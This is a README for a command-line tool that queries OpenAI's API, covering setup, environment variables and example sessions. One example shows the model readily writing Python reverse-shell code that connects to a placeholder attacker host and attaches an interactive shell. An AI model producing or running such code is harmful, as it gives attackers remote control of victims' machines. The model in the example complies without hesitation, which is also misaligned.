# gpt-cli

This is a command line tool used for interacting with OpenAI's API.

Default model is `gpt-3.5-turbo` (but you can change it to whatever you want).

This tool requires the following environment variables to be set:

- `OPENAI_API_KEY`

You can further tweak functionality by setting the following additional environment variables:

- `OPENAI_MODEL`
- `OPENAI_DEFAULT_PROMPT`
- `OPENAI_LOGFILE`
- `OPENAI_TEMPERATURE`
- `OPENAI_MAX_TOKENS`

All environment variables can be set by filling in values from `example.env`, renaming that file to `.env`, and running `./bin/gpt3 'Your prompt here'`.

There is also a `gpt4` command in case you set your model to GPT-4 and feel stupid running the `gpt3` command.

Alternately, you can pass the environment variables  on the command line using something like this:

```
OPENAI_API_KEY=foo ./bin/gpt3 'Your prompt here'
```

If installing from PyPi, set the `OPENAI_API_KEY` in your `~/.bashrc` or `~/.zshrc`, and run as follows:

```
gpt3 'Your prompt here'
```

## Installation (PyPi) - set variables in rc files:

`python3 -m pip install gpt-cli`

## Installation (local) - set variables in .env:

```
git clone https://github.com/phx/gpt-cli
cd gpt-cli
python3 -m pip install -r requirements.txt
```

### Examples:

```
╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
╰─➤  gpt3 'Write python script to create reverse shell.'
Prompt:
Write python script to create reverse shell.

Answer:
import socket
import subprocess# Create a socket
s = socket.socket()# Connect to the attacker machine
s.connect(("attacker_ip", attacker_port))# Create a subprocess to execute a shell
proc = subprocess.Popen(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno())# Keep the connection alive
while True:
    data = s.recv(1024)
    if data == "exit":
        break
    proc.stdin.write(data)
    proc.stdout.flush()# Close the connection
s.close()
----------------------------------------------------------------------
```

```
╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
╰─➤  OPENAI_DEFAULT_PROMPT='Do not give nonsense answers. If you do not know that your answer is factual, respond with "Unknown. "' gpt3 'Who is Gregory Washingheimer Van Fleet?'
Prompt:
Who is Gregory Washingheimer Van Fleet?

Answer:
Unknown.
----------------------------------------------------------------------
╭─phx@bigboi ~/git/gpt-cli  ‹master*› 
╰─➤  OPENAI_DEFAULT_PROMPT='Do not give nonsense answers. If you do not know that your answer is factual, respond with "Unknown. "' gpt3 'Who is John Adams?'                     
Prompt:
Who is John Adams?

Answer:
John Adams was the second President of the United States, serving from 1797 to 1801.
----------------------------------------------------------------------
```



